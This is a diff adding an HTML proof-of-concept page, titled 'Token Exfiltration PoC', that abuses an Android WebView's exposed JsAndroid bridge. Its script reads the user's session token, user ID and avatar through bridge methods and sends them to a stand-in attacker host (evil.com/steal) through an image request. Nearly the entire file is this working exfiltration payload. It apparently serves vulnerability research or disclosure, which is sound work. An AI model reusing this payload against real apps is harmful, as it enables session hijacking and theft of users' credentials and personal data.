@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head><title>Exfiltrating Token...</title></head>
+<body>
+<h2>Token Exfiltration PoC</h2>
+<script>
+try {
+    var token = JsAndroid.getToken();
+    var uid = JsAndroid.getUid();
+    var avatar = JsAndroid.getHeadPic();
+
+    document.body.innerHTML = "<pre>Token: " + token + "\nUID: " + uid
+        + "\nAvatar: " + avatar + "</pre>";
+
+    // Exfiltrate to attacker server
+    new Image().src = "https://evil.com/steal?token=" + encodeURIComponent(token)
+                   + "&uid=" + encodeURIComponent(uid)
+                   + "&avatar=" + encodeURIComponent(avatar);
+} catch(e) {
+    document.body.innerHTML = "Error: " + e;
+}
+</script>
+</body>
+</html>
